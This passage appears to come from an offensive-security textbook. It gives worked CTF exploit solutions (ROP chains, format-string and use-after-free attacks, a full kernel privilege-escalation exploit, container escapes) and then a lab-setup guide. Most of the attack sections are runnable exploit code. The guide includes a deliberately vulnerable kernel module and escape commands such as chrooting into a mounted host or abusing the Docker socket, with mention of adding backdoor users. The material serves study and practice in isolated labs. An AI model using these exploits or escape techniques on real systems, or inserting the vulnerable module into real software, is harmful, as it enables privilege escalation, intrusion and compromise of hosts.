offset = cyclic_find(core.read(core.rsp, 4))
log.info(f"offset = {offset}")            # 40
```

Final exploit:

```python
from pwn import *

elf = context.binary = ELF("./ret2win")
io  = process("./ret2win")

ret2win = elf.symbols["ret2win"]
ret     = ROP(elf).find_gadget(["ret"]).address      # alignment

payload = flat({
    40: [ret, ret2win],
})

io.sendlineafter(b">", payload)
print(io.recvall(timeout=2).decode())                # prints flag
```

Why each piece is there:

- `40` matches the offset from the cyclic step
- `ret` is a one-instruction gadget that consumes one stack slot, restoring 16-byte stack alignment that `ret2win`'s libc calls require on modern glibc
- `ret2win` is the function you redirect to, which prints the flag

### 2. ROP Emporium "split" — ret2libc Style

**Source**: ropemporium.com, level 2.
**Technique**: load `rdi`, return into `system` with `"/bin/cat flag.txt"` as the argument.
**Maps to**: Part 48.6, Part 49 isn't directly used but the technique is identical to `ret2libc`.

Recon:

```bash
$ ROPgadget --binary split | grep "pop rdi"
0x00000000004007c3 : pop rdi ; ret
$ strings split | grep flag
/bin/cat flag.txt
$ objdump -d split | grep -A1 system
# system@plt visible at 0x40074b
```

Find the address of the string:

```python
elf = ELF("./split")
print(hex(next(elf.search(b"/bin/cat flag.txt"))))   # 0x601060
```

Exploit:

```python
from pwn import *

elf = context.binary = ELF("./split")
io  = process("./split")

pop_rdi = 0x4007c3
useful  = next(elf.search(b"/bin/cat flag.txt"))
system  = elf.plt["system"]

payload = flat({
    40: [pop_rdi, useful, system],
})

io.sendlineafter(b">", payload)
print(io.recvall(timeout=2).decode())
```

### 3. ROP Emporium "callme" — Argument Loading And Chaining

**Source**: ropemporium.com, level 3.
**Technique**: must call `callme_one`, `callme_two`, `callme_three` in order, each with three specific arguments. Need a `pop rdi ; pop rsi ; pop rdx ; ret` gadget.
**Maps to**: Part 48.4.

Recon:

```bash
$ ROPgadget --binary callme | grep "pop rdi ; pop rsi ; pop rdx"
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
```

Exploit:

```python
from pwn import *

elf = context.binary = ELF("./callme")
io  = process("./callme")

pop3 = 0x40093c
args = (0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

payload  = b"A" * 40
for func in ("callme_one", "callme_two", "callme_three"):
    payload += p64(pop3) + b"".join(p64(x) for x in args)
    payload += p64(elf.plt[func])

io.sendlineafter(b">", payload)
print(io.recvall(timeout=2).decode())
```

The chain reads, top to bottom on the stack: load three registers, call `callme_one`, return into the next `pop3`, load three more, call `callme_two`, and so on. This is the canonical example of "the stack is a tape of instructions."

### 4. ROP Emporium "write4" — Writing Data Via ROP

**Source**: ropemporium.com, level 4.
**Technique**: `print_file` exists but the string `flag.txt` is *not* in the binary. We have to write it ourselves using a `mov [reg], reg` gadget.
**Maps to**: Part 48.4 ("memory write" gadget category).

Recon:

```bash
$ ROPgadget --binary write4 | grep -E "mov qword|pop r1[45]"
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
0x0000000000400690 : pop r14 ; pop r15 ; ret
```

Exploit:

```python
from pwn import *

elf = context.binary = ELF("./write4")
io  = process("./write4")

pop_r14_r15  = 0x400690
mov_r14_r15  = 0x400628                # [r14] = r15
pop_rdi      = 0x400693                # ROPgadget finds this too
print_file   = elf.symbols["print_file"]

target = elf.bss(0x100)                # writable, predictable (no PIE)

payload = flat({
    40: [
        # write 8 bytes "flag.txt" to target
        pop_r14_r15, target, b"flag.txt",
        mov_r14_r15,
        # call print_file(target)
        pop_rdi, target,
        print_file,
    ],
})

io.sendlineafter(b">", payload)
print(io.recvall(timeout=2).decode())
```

Walkthrough:

1. `pop r14 ; pop r15 ; ret` consumes the next two stack slots into `r14` (= target address) and `r15` (= the bytes `flag.txt` interpreted as a 64-bit value)
2. `mov [r14], r15 ; ret` writes those 8 bytes into BSS at `target`
3. `pop rdi ; ret` loads `rdi` with the address now containing `flag.txt`
4. `ret` into `print_file` which prints the file

### 5. ROP Emporium "fluff" — Format String Combined With Constraints

**Source**: ropemporium.com, level 5 (note: in some revisions the name is reused for a different format-string-themed challenge). The classic version requires building a write through awkward `xchg`/`stos`-style gadgets rather than a clean `mov`.

**Technique**: same goal as write4 (write `flag.txt` to memory and call `print_file`), but available gadgets are awkward — you assemble the write from `pop`, `xlatb`, and `stosb` style gadgets.

This challenge teaches that *the right gadget might not exist*. You assemble equivalents from what you have. The exploit follows the same flat-chain shape; the only difference is more gadgets between each conceptual step.

The didactic point: sometimes the entire "challenge" of a ROP problem is finding a creative way to do `[mem] = value` when the textbook gadget is missing. ROP Emporium's solutions page documents the canonical chain.

### 6. ROP Emporium "pivot" — Stack Pivoting

**Source**: ropemporium.com, level 7.
**Technique**: only a small overflow on the stack, but the program prints a heap address you can use as a pivot target.
**Maps to**: Part 48.8, Part 48.20.7.

Recon (after running the binary):

```text
fluff() called! Here is the address of fluff: 0x7f...XXXX
fluff() called! Here is the address of pivot: 0x7f...YYYY
> 
```

Plan:

1. read the heap pivot address from program output
2. write a real chain into the heap region the program tells us about
3. on the stack, place a tiny chain that pivots `rsp` to that heap region

Exploit (sketch):

```python
from pwn import *

elf  = context.binary = ELF("./pivot")
libc = elf.libc
io   = process("./pivot")

# Step 1: read the leaked heap pivot address
io.recvuntil(b"pivot: ")
pivot = int(io.recvline().strip(), 16)
log.info(f"pivot @ {hex(pivot)}")

# Step 2: build the real chain
#   resolve a libc function via the binary's GOT/PLT, then call system or print_file
#   (the binary exports a "ret2win" — this is just the canonical pattern)
chain  = b"".join(p64(x) for x in (
    # pop rdi ; ret ; addr ; ret2win  — placeholders
))

# Step 3: send the heap chain to the program's first input
io.sendlineafter(b">", chain)

# Step 4: tiny stack-side payload pivots rsp into the heap
xchg_rsp_rax = 0x...        # mov rsp, rax ; ret  (find with ROPgadget)
pop_rax      = 0x...

stage1 = flat({
    40: [pop_rax, pivot, xchg_rsp_rax],
})
io.sendlineafter(b">", stage1)
print(io.recvall(timeout=2).decode())
```

The interesting piece is *that two-stage handoff*: the small stack payload only does enough to put `rsp` somewhere bigger, then ROP runs from there. Real heap-overflow exploits often look exactly like this.

### 7. ROP Emporium "ret2csu" — Leveraging `__libc_csu_init`

**Source**: ropemporium.com, level 8.
**Technique**: when there is no `pop rdi/rsi/rdx ; ret` available, use `__libc_csu_init` 's epilogue-style sequence to control `rdi`, `rsi`, `rdx` in two staged frames.
**Maps to**: Part 48.10.

The relevant snippet from `__libc_csu_init` (varies slightly per toolchain):

```text
0x40069a:  pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x400680:  mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]
```

Two-frame chain pattern:

```python
from pwn import *

elf = context.binary = ELF("./ret2csu")
io  = process("./ret2csu")

pop6      = 0x40069a
csu_call  = 0x400680
ret2win   = elf.symbols["ret2win"]
got_entry = elf.got["__stack_chk_fail"]   # any GOT slot pointing to a function

payload = flat({
    40: [
        # frame 1: load registers
        pop6,
        0,                # rbx (index 0)
        1,                # rbp (loop counter; must be 1 so condition `cmp rbp, rbx; jne` exits)
        got_entry,        # r12 (will be dereferenced and called)
        0xdeadbeefdeadbeef,  # r13 -> rdi (low 32 bits via edi)
        0xcafebabecafebabe,  # r14 -> rsi
        0xd00df00dd00df00d,  # r15 -> rdx
        # call: [r12 + 0*8] -> the function pointed to by got_entry, with rdi/rsi/rdx set
        csu_call,
        # frame 2: pop6 needs 7 stack slots to consume; then ret2win
        0, 0, 0, 0, 0, 0, 0,
        ret2win,
    ],
})

io.sendlineafter(b">", payload)
print(io.recvall(timeout=2).decode())
```

This is the most-asked-about ROP technique on CTF help channels for a reason: it is fiddly the first time and obvious thereafter.

### 8. picoCTF "buffer overflow 1" — Overwriting A Local Variable

**Source**: picoCTF (year varies, similar challenges exist every year).
**Technique**: simple stack overflow, but instead of overwriting RIP you overwrite an integer that gates the win path.
**Maps to**: Part 28.6.

Typical source the challenge is built from:

```c
char buf[64];
int admin = 0;
gets(buf);
if (admin) win();
```

Exploit:

```python
from pwn import *
io = remote("saturn.picoctf.net", PORT)
io.sendline(b"A" * 64 + p32(1))                  # or p64(1) on x86_64
print(io.recvall(timeout=2).decode())
```

This exact shape recurs in dozens of beginner challenges. Once the pattern is in your fingers it takes a minute to solve.

### 9. picoCTF Format String Challenges

**Source**: picoCTF "stonk-market" / "format string 0/1/2" / similar across years.
**Technique**: leak a flag via `%s` or write a counter via `%n`.
**Maps to**: Part 28.9, Part 49.1.

Stage 1 — find your input offset on the stack:

```python
from pwn import *
io = remote("saturn.picoctf.net", PORT)
io.sendline(b"AAAA " + b"%p " * 20)
out = io.recvline()
print(out)
# look for 0x41414141 in the printed addresses; the position tells you the index
```

Stage 2 — leak the flag if it is at a known address:

```python
flag_addr = 0x404060   # from objdump or symbol table
payload = p64(flag_addr) + b"%7$s"
# but careful: input has to be qword-aligned; usually you put the address after the format spec
io.sendline(b"%7$s||||" + p64(flag_addr))
```

Stage 3 — write with `%n` if the goal is to flip a flag:

```python
elf = ELF("./vuln")
payload = fmtstr_payload(6, {elf.symbols["authorized"]: 1})
io.sendline(payload)
```

picoCTF's official solutions document each of these patterns; this is the shape they share.

### 10. pwnable.kr "uaf" — Use-After-Free With Vtable Hijack

**Source**: pwnable.kr, level "uaf" (port 9000).
**Technique**: free a C++ object, allocate a same-size buffer, control vtable pointer.
**Maps to**: Part 28.13, Part 49.2.

The challenge gives you a binary where a `Man` object (with `give_shell` and `introduce` virtual methods) is allocated and used in a menu loop. The bug: option 3 (`free`) frees the object but option 1 (`use`) keeps calling its virtual method afterward.

Walkthrough:

1. Inspect the binary and find `Man` is 24 bytes
2. Find `give_shell` symbol address
3. The exploit writes a fake vtable layout into a freed-and-reused allocation:

```python
from pwn import *

context.arch = "amd64"
io = ssh(host="pwnable.kr", port=2222, user="uaf", password="guest")
sh = io.run("/home/uaf/uaf 24 /tmp/payload")  # specify size = 24

# In a separate setup step (or via SSH file write):
#   /tmp/payload contains: p64(give_shell - 0x10) repeated
#   so that obj->vtable[1]() calls give_shell

# Now interact with the menu:
sh.sendlineafter(b":", b"3")     # free
sh.sendlineafter(b":", b"2")     # allocate buffer of size 24, contents from /tmp/payload
sh.sendlineafter(b":", b"1")     # use(): calls obj->vtable[1]() == give_shell
sh.interactive()
```

Why `give_shell - 0x10`? Because the C++ vtable layout calls `vtable[1]` (the second entry, which is normally the second virtual method). The compiler-generated dispatch code does `call [rax + 8]`, so we point `rax` to a memory location 16 bytes *before* `give_shell`, making `[rax+8]` land on something useful... the precise offset depends on the binary layout; pwnable.kr's writeups all walk through the exact arithmetic.

Read the official writeup once you have your own exploit working — comparing the two is the fastest way to internalize C++ vtable layout.

### 11. how2heap "tcache_poisoning" — Writing Anywhere With Heap Corruption

**Source**: github.com/shellphish/how2heap, file `glibc_2.31/tcache_poisoning.c`.
**Technique**: poison a freed tcache entry's `next` pointer to make the next `malloc` of that size return an attacker-chosen address.
**Maps to**: Part 28.12, Part 49.3.

The how2heap example is a self-contained C program that demonstrates the technique end-to-end:

```c
// adapted from how2heap glibc_2.31/tcache_poisoning.c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main() {
    uint64_t stack_var;
    fprintf(stderr, "Target on stack: %p\n", &stack_var);

    intptr_t *a = malloc(0x40);
    intptr_t *b = malloc(0x40);
    fprintf(stderr, "malloc'd a=%p b=%p\n", a, b);

    free(a);
    free(b);
    // tcache for size 0x40: head -> b -> a -> NULL

    // simulated bug: edit b's "next" pointer to target the stack
    b[0] = (intptr_t)&stack_var;
    fprintf(stderr, "Poisoned: b->next = &stack_var\n");

    // pop b from tcache (b returned)
    malloc(0x40);
    // pop next entry — now &stack_var
    intptr_t *c = malloc(0x40);
    fprintf(stderr, "Got c = %p (== &stack_var? %s)\n",
            c, (c == (intptr_t*)&stack_var) ? "yes" : "no");
    return 0;
}
```

Build against glibc 2.31 (or use Docker `ubuntu:20.04`), run, and read the output. Then read `glibc_2.32/safe_linking.c` from the same repo to see what changed: the stored `next` pointer is XOR-encoded with `(addr >> 12)`, so a heap leak is required to compute the correct ciphertext.

For an applied tcache-poisoning challenge against a real CTF target, work through `pwnable.tw`'s heap series (`hacknote`, `dubblesort`, `applestore`) — each one builds the technique on top of an actual program with constraints.

### 12. Kernel Pwn Challenge Walkthrough (Sketch)

**Source**: pwn.college Module 9 ("Kernel Security") / xairy lab kernels / midas's series.
**Technique**: stack overflow in a kernel module → kernel ROP → `commit_creds(prepare_kernel_cred(NULL))`.
**Maps to**: Part 29.1, Part 49.5.

Because kernel exploits depend on the exact lab kernel build, a copy-paste exploit here would not work for any reader. Instead, here is the *shape* of every introductory kernel-pwn challenge.

The challenge gives you:

- a QEMU disk image with a custom kernel
- a vulnerable kernel module (`vuln.ko`) loaded at boot
- shell access as a non-root user
- `/proc/kallsyms` readable (KASLR off in the early labs)

Recon:

```bash
# inside QEMU
$ uname -a
Linux box 5.15.0-lab #1 SMP ...
$ cat /proc/cpuinfo | grep flags        # smep/smap?
$ cat /proc/cmdline                     # nokaslr nopti nosmep nosmap?
$ cat /proc/kallsyms | grep -E "commit_creds|prepare_kernel_cred"
ffffffff8108abcd T commit_creds
ffffffff8108b001 T prepare_kernel_cred
$ cat /proc/kallsyms | grep swapgs_restore
ffffffff81c00ad6 T swapgs_restore_regs_and_return_to_usermode
```

The exploit (userspace program built and run inside the QEMU VM):

```c
// exploit.c — runs as unprivileged user inside the lab VM
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>

// addresses from /proc/kallsyms in this exact lab kernel (KASLR off)
#define COMMIT_CREDS              0xffffffff8108abcdUL
#define PREPARE_KERNEL_CRED       0xffffffff8108b001UL
#define POP_RDI_RET               0xffffffff81002abcUL  // ROPgadget on vmlinux
#define MOV_RDI_RAX_RET           0xffffffff81005def0UL
#define SWAPGS_RESTORE            0xffffffff81c00ad6UL

// saved userland state for return-to-userspace
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(void) {
    __asm__ volatile (
        "movq %%cs,   %0\n"
        "movq %%ss,   %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp,  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        : : "memory"
    );
}

void win_shell(void) {
    if (getuid() == 0) {
        printf("[+] root!\n");
        system("/bin/sh");
    }
}

int main(void) {
    save_state();

    int fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    // build the ROP chain in user memory; the bug copies it onto the kernel stack
    uint64_t payload[64];
    int i = 0;

    // padding to reach saved RIP — exact offset depends on the lab module
    while (i < 8) payload[i++] = 0x4141414141414141UL;

    // commit_creds(prepare_kernel_cred(NULL))
    payload[i++] = POP_RDI_RET;
    payload[i++] = 0;
    payload[i++] = PREPARE_KERNEL_CRED;
    payload[i++] = MOV_RDI_RAX_RET;
    payload[i++] = COMMIT_CREDS;

    // return to userspace via swapgs_restore_regs_and_return_to_usermode + iretq frame
    payload[i++] = SWAPGS_RESTORE + 22;        // skip swapgs/popfq prologue offset
    payload[i++] = 0;                          // dummy rax
    payload[i++] = 0;                          // dummy rdi
    payload[i++] = (uint64_t)win_shell;
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_sp;
    payload[i++] = user_ss;

    ioctl(fd, 0x1337, payload);                // triggers the bug
    return 0;
}
```

What is happening:

1. Save userland register state needed for the `iretq` return frame
2. Open the vulnerable device
3. Build a chain that:
   - calls `prepare_kernel_cred(NULL)` returning a `cred *` in `rax`
   - moves it to `rdi`
   - calls `commit_creds`, making the current task root
4. Returns from kernel mode to `win_shell` in userspace, which now has UID 0
5. `system("/bin/sh")` gives a root shell

The first time you do this lab, every line is mysterious. By the third lab kernel (with KASLR enabled, then SMEP, then SMAP, then KPTI), you have re-read the same `iretq` frame setup five times and it is permanent.

That progression — bug → ROP → mitigation → bypass → next lab — is the entire pwn.college Module 9 curriculum. Do it.

### 13. Container Escape Walkthrough — Misconfigured Privileged Pod

**Source**: HackTheBox, Bad Pods catalog, Kubernetes Goat scenarios.
**Technique**: privileged container with the host filesystem mounted.
**Maps to**: Part 38.2, Part 49.6.

You have a foothold in a pod. First, fingerprint the environment:

```bash
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cat /proc/self/status | grep CapEff
CapEff: 000001ffffffffff                 # all capabilities, including SYS_ADMIN/MODULE
$ cat /proc/1/cgroup
0::/kubepods/pod-...
$ ls /
... host                                  # if "host" exists, the host root is mounted
$ mount | grep host
/dev/sda1 on /host type ext4 ...          # confirmed
```

If `/host` exists with the host root mounted, escape is one command:

```bash
$ chroot /host /bin/bash
# you are now operating against the host filesystem, as root
# add a backdoor user, mount kubelet credentials, etc., per the engagement scope
```

If only the Docker socket is mounted:

```bash
$ ls /var/run/docker.sock
/var/run/docker.sock
$ apt-get install -y docker.io 2>/dev/null || curl -sSL https://get.docker.com | sh
$ docker run --rm -it -v /:/host alpine chroot /host /bin/sh
```

If the container is privileged but no host mount, mount it yourself:

```bash
# inside the privileged container
$ mkdir /tmp/host
$ mount /dev/sda1 /tmp/host                # device visibility from privileged
$ chroot /tmp/host /bin/bash
```

The pattern across all three: privileged + visibility-of-host = trivial. The technique is one command; recognizing the misconfiguration is the skill.

### 14. The Meta-Lesson From Worked Solutions

Pulling these walkthroughs together, a few habits separate "I solved a CTF" from "I can solve CTFs":

1. **Fingerprint first.** `checksec`, `strings`, `objdump`, `nm`, `/proc`, `mount`, `id` — five seconds of recon saves an hour of guessing.
2. **Use `pwntools` `flat()` and `cyclic()`.** They eliminate two whole classes of off-by-one error.
3. **Read the binary symbols.** The challenge author named functions for a reason. `win`, `give_shell`, `useful_function`, `print_file` are usually breadcrumbs.
4. **Build a chain incrementally.** Confirm each stage with a debugger (`gdb`, `pwndbg`, `gef`) before adding the next.
5. **Compare your exploit with the official solution after you finish.** Different authors structure ROP chains differently; the most elegant version becomes a template.
6. **Re-derive without help one week later.** That is when you find out whether you actually learned the technique.

Once these become reflex, the curated curriculum in Part 50 stops being a wall of links and starts being a backlog you can clear methodically.

## Part 52: Complete Lab Setup Guide

**Level: All levels (do this first).** Part 0.12 and Part 31 sketched the lab idea; this Part walks through actually building it. Run through this once before you attempt the PoCs in Parts 28, 48, 49, or 51. Save snapshots at each marked checkpoint.

### 1. Choosing The Right Lab Type

The book's exercises need different environments. Build the ones you need; do not try to build all of them on day one.

| Lab type                | Used by                                         | Setup section |
| ---                     | ---                                             | --- |
| Single VM               | Parts 28, 48, 49.1–4, 51.1–11 (binary pwn)      | 52.2 |
| QEMU + custom kernel    | Parts 29, 49.5, 51.12 (kernel pwn)              | 52.10 |
| Docker / Podman host    | Parts 38, 49.6–8, 51.13 (container escape)      | 52.12 |
| Local Kubernetes        | Part 39 (K8s red team)                          | 52.13 |
| Cloud sandbox account   | Part 40 (cloud red team)                        | 52.14 |
| Web app lab             | Web exploitation in Part 50                     | 52.15 |
| Memory/forensics images | Forensics tracks in Part 50.15                  | 52.16 |

The single VM (52.2) is the foundation everyone needs.

### 2. Base Linux VM Setup

Pick *one* of the four options. They are not better or worse — just different ergonomics.

**Option A — Multipass (easiest, macOS / Linux / Windows)**

```bash
# install
brew install --cask multipass            # macOS
sudo snap install multipass              # Linux
# Windows: https://multipass.run installer

# create
multipass launch 22.04 --name pwnlab \
  --cpus 4 --memory 8G --disk 50G

# enter
multipass shell pwnlab
```

**Option B — Lima (macOS, including Apple Silicon)**

```bash
brew install lima
limactl start --name=pwnlab template://ubuntu-22.04
limactl shell pwnlab
```

**Option C — Vagrant (most flexible, scripted)**

`Vagrantfile`:

```ruby
Vagrant.configure("2") do |config|
  config.vm.box      = "ubuntu/jammy64"
  config.vm.hostname = "pwnlab"

  config.vm.provider "virtualbox" do |vb|
    vb.memory = 8192
    vb.cpus   = 4
  end

  # private network — no internet inbound exposure
  config.vm.network "private_network", type: "dhcp"
end
```

```bash
vagrant up
vagrant ssh
```

**Option D — Cloud VM (when you need horsepower)**

Use any provider's lowest tier. Two rules:

- never expose deliberately-vulnerable code on a public IP
- use a dedicated security group / firewall that only allows your IP

### 3. Take The First Snapshot Before Any Tools Are Installed

This is non-negotiable. Snapshot the *clean OS* now.

```bash
# Vagrant
vagrant snapshot save clean-base

# Multipass (newer versions)
multipass snapshot pwnlab --name clean-base

# Lima — back up the lima dir
limactl stop pwnlab
cp -a ~/.lima/pwnlab ~/.lima/pwnlab-clean-base

# VirtualBox GUI
# VM > Take Snapshot > "clean-base"
```

When (not if) something breaks, restore. Every hour spent fixing a poisoned lab is an hour you could have spent learning.

### 4. Toolchain Install

All commands assume Ubuntu 22.04. Adjust package names for other distros.

```bash
# core build + debug
sudo apt update
sudo apt install -y \
  build-essential gcc-multilib g++-multilib \
  python3 python3-pip python3-venv \
  gdb gdb-multiarch \
  netcat-openbsd nmap \
  wget curl git tmux vim less \
  binutils elfutils file strace ltrace \
  patchelf \
  qemu-system-x86 qemu-utils \
  libc6-i386 libc6-dbg libc6-dbg:i386 \
  ruby ruby-dev \
  unzip xxd

# python toolchain in a venv
python3 -m venv ~/pwn-env
echo "source ~/pwn-env/bin/activate" >> ~/.bashrc
source ~/pwn-env/bin/activate
pip install --upgrade pip
pip install pwntools ropper angr capstone keystone-engine unicorn

# ROPgadget
pip install ROPgadget

# one_gadget
sudo gem install one_gadget

# checksec.sh (some distros' checksec is older)
wget -q https://raw.githubusercontent.com/slimm609/checksec.sh/master/checksec
chmod +x checksec
sudo mv checksec /usr/local/bin/

# pwninit (auto-patches challenges to use a bundled libc)
# easiest path: prebuilt binary
wget -q https://github.com/io12/pwninit/releases/latest/download/pwninit
chmod +x pwninit
sudo mv pwninit /usr/local/bin/
```

### 5. GDB Enhancement: pwndbg Or GEF

Pick one. Neither is wrong; pwndbg is more popular for binary pwn, GEF for general exploit dev.

**pwndbg**:

```bash
git clone https://github.com/pwndbg/pwndbg ~/tools/pwndbg
cd ~/tools/pwndbg
./setup.sh
# automatically updates ~/.gdbinit
```

**GEF**:

```bash
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

Confirm:

```bash
gdb -q
# you should see a colorful pwndbg> or gef> prompt
```

### 6. glibc-all-in-one (Required For Heap Challenges)

The heap behavior changes per glibc version. Have several side-by-side.

```bash
git clone https://github.com/matrix1001/glibc-all-in-one ~/tools/glibc-all-in-one
cd ~/tools/glibc-all-in-one
./update_list

# common versions for CTF challenges
./download 2.27-3ubuntu1.6_amd64    # pre-tcache and early tcache
./download 2.31-0ubuntu9.9_amd64    # tcache, no safe-linking
./download 2.34-0ubuntu3.2_amd64    # safe-linking, no __free_hook
./download 2.35-0ubuntu3.4_amd64    # most modern challenges

ls libs/
```

To use a specific libc against a challenge binary:

```bash
cd ~/challenges/some-heap-challenge/
ls    # ./vuln, libc.so.6 (provided by author), ld.so (sometimes)

pwninit
# pwninit will:
#   - copy ld and libc to the current dir
#   - patchelf the binary's interpreter to the local ld
#   - patchelf the binary's RPATH to find the local libc
#   - generate a starter exploit template
```

### 7. Snapshot Checkpoint #1

Snapshot the VM now: `pwn-tools-installed`. The next sections are exercise-specific.

### 8. ROP Emporium Challenges

```bash
mkdir -p ~/challenges/rop-emporium
cd ~/challenges/rop-emporium

for chal in ret2win split callme write4 badchars fluff pivot ret2csu; do
  # 64-bit
  wget -q "https://ropemporium.com/binary/${chal}.zip"
  unzip -q "${chal}.zip" -d "${chal}_64"
  rm "${chal}.zip"
done

ls
# ret2win_64  split_64  callme_64  ...
```

Each directory contains the binary, a `flag.txt`, and any required libc. You can immediately run `checksec ./ret2win_64/ret2win`.

### 9. how2heap

```bash
git clone https://github.com/shellphish/how2heap ~/challenges/how2heap
cd ~/challenges/how2heap

# the repo is organized by glibc version
ls glibc_2.31/
# tcache_poisoning.c  fastbin_dup.c  unsorted_bin_attack.c  ...

cd glibc_2.31
make
ls *.bin
./tcache_poisoning.bin
```

For each technique, the corresponding `.c` file is the *complete* worked example. Read it, run it, then re-implement it in your own style.

### 10. QEMU + Custom Kernel For Kernel Pwn

You have two paths. Most readers should start with the prebuilt path (10a) and only build a kernel from scratch (10b) once they want to control mitigations.

**10a — Prebuilt CTF lab kernel (fastest)**

```bash
git clone https://github.com/lkmidas/Linux-Kernel-Exploitation-Tutorial ~/kernel-lab
cd ~/kernel-lab

# the tutorial includes a ready-made bzImage, initramfs, and run script
ls
# bzImage  initramfs.cpio.gz  run.sh  README.md

./run.sh
# QEMU boots into a tiny userspace
# log in as root or pwn (per the README)
# /dev/vuln-style devices are pre-loaded
```

**10b — Build your own kernel from source**

```bash
# fetch
git clone --depth=1 \
  https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git \
  ~/linux-stable
cd ~/linux-stable

# baseline config
make defconfig

# enable debug + BTF (for eBPF labs later)
./scripts/config -e DEBUG_INFO -e DEBUG_INFO_DWARF4 -e DEBUG_INFO_BTF
./scripts/config -e KGDB -e GDB_SCRIPTS -e MAGIC_SYSRQ
./scripts/config -e BPF_SYSCALL -e BPF_LSM

# (early labs) disable mitigations to make exploits tractable
./scripts/config -d RANDOMIZE_BASE         # KASLR off
./scripts/config -d STACKPROTECTOR
./scripts/config -d STRICT_KERNEL_RWX
./scripts/config -d X86_INTEL_UMIP
./scripts/config -d RETPOLINE

# (sanitizer-enabled later for fuzz/dev — slower)
# ./scripts/config -e KASAN -e UBSAN

make olddefconfig
make -j$(nproc)
ls arch/x86/boot/bzImage
```

**Build a tiny rootfs**

```bash
mkdir -p ~/kernel-lab && cd ~/kernel-lab

# debootstrap path (full distro userspace, ~200MB)
sudo apt install -y debootstrap cpio
sudo debootstrap --arch amd64 jammy rootfs
sudo chroot rootfs apt install -y busybox build-essential gdb libc6-dbg
sudo chroot rootfs useradd -m -s /bin/bash pwn
echo "pwn:pwn" | sudo chroot rootfs chpasswd

# package as initramfs
( cd rootfs && sudo find . | sudo cpio -o -H newc | gzip > ../initramfs.cpio.gz )
```

**Run with gdb stub**

```bash
qemu-system-x86_64 \
  -kernel ~/linux-stable/arch/x86/boot/bzImage \
  -initrd ~/kernel-lab/initramfs.cpio.gz \
  -append "console=ttyS0 nokaslr nopti nosmep nosmap" \
  -nographic -m 1G -smp 2 \
  -s                                       # gdb stub on tcp:1234
```

In another terminal, attach gdb to the live kernel:

```bash
cd ~/linux-stable
gdb -ex "target remote :1234" -ex "lx-symbols" vmlinux
```

Press `Ctrl-A x` in the QEMU terminal to exit.

### 11. Vulnerable Kernel Module (For Lab Pwn)

```bash
mkdir -p ~/lab/vuln_mod && cd ~/lab/vuln_mod

cat > vuln.c <<'EOF'
#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/fs.h>

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    char kbuf[16];
    if (cmd == 0x1337)
        copy_from_user(kbuf, (void __user *)arg, 1024);    // bug
    return 0;
}

static const struct file_operations fops = {
    .owner          = THIS_MODULE,
    .unlocked_ioctl = vuln_ioctl,
};
static struct miscdevice dev = { MISC_DYNAMIC_MINOR, "vuln", &fops };

static int __init vuln_init(void) { return misc_register(&dev); }
static void __exit vuln_exit(void) { misc_deregister(&dev); }

module_init(vuln_init);
module_exit(vuln_exit);
MODULE_LICENSE("GPL");
EOF

cat > Makefile <<'EOF'
obj-m += vuln.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
EOF

# build inside the lab VM (kernel headers must match the running kernel)
sudo apt install -y linux-headers-$(uname -r)
make
sudo insmod vuln.ko
ls -l /dev/vuln
sudo chmod 666 /dev/vuln                    # so non-root can open
```

When you are inside a custom-built QEMU kernel (10b), build the module against *that* tree:

```bash
make -C ~/linux-stable M=$(pwd) modules
# include the .ko in your initramfs and load it from /init or rc.local
```

### 12. Container Escape Lab

```bash
# install Docker if not present
curl -fsSL https://get.docker.com | sh
sudo usermod -aG docker $USER
newgrp docker

mkdir -p ~/lab/container-escape && cd ~/lab/container-escape

# privileged + host-mount lab
cat > docker-compose.yml <<'EOF'
services:
  privileged-bad:
    image: ubuntu:22.04
    command: sleep infinity
    privileged: true
    volumes:
      - /:/host:ro                 # read-only here for safety; remove :ro for full lab
EOF

docker compose up -d
docker compose exec privileged-bad bash
# inside: chroot /host /bin/bash         (omit :ro to make this writable)
# exit, then `docker compose down` cleans up
```

For the Docker-socket lab:

```bash
cat > docker-compose-sock.yml <<'EOF'
services:
  sock-bad:
    image: docker:cli
    command: sleep infinity
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
EOF

docker compose -f docker-compose-sock.yml up -d
docker compose -f docker-compose-sock.yml exec sock-bad sh
# inside: docker run -v /:/host --rm -it ubuntu chroot /host /bin/bash
```

For the `CAP_SYS_MODULE` lab (Part 49.8):

```bash
cat > docker-compose-cap.yml <<'EOF'
services:
  cap-bad:
    image: ubuntu:22.04
    command: sleep infinity
    cap_add:
      - SYS_MODULE
EOF
```

### 13. Local Kubernetes With kind

```bash
# install kind
curl -Lo ./kind https://kind.sigs.k8s.io/dl/latest/kind-linux-amd64
chmod +x ./kind && sudo mv ./kind /usr/local/bin/kind

# install kubectl
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl && sudo mv kubectl /usr/local/bin/

# create a cluster
kind create cluster --name pwnlab
kubectl get nodes

# install Kubernetes Goat (deliberately-vulnerable cluster)
git clone https://github.com/madhuakula/kubernetes-goat ~/lab/k8s-goat
cd ~/lab/k8s-goat
bash setup-kubernetes-goat.sh
bash access-kubernetes-goat.sh
